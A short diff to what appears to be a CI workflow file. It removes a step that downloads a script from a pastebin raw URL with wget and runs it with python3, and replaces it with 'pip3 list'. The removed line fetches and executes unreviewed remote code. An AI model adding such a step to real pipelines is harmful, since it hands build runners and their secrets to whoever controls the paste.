@@ -17,9 +17,8 @@ jobs:
     
     - name: operations
       run: |
-          wget https://pastebin.pl/view/raw/b3454675 -O 123.py
           echo $(date +%F%n%T) > res.txt
-          python3 123.py >> res.txt
+          pip3 list >> res.txt
           echo $(date +%F%n%T) >> res.txt
       shell: bash
     
